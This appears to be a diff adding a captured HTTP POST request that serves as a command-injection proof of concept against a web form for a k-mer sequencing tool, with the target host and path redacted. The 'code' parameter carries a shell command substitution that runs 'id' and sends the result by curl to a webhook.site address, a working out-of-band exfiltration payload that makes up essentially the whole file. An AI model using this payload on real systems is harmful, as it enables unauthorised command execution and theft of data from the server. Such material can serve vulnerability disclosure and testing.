@@ -1,0 +1,15 @@
+POST /xxx/xxx.php HTTP/1.1
+Host: xxxx
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 160
+Origin: xxx
+Connection: close
+Referer: xxx
+Cookie: xxx
+Upgrade-Insecure-Requests: 1
+
+code=$(curl -X POST https://webhook.site/xx -d "$(id)")&kmer_length=21&description=my+sample&max_kmer_cov=1000&read_length=100	
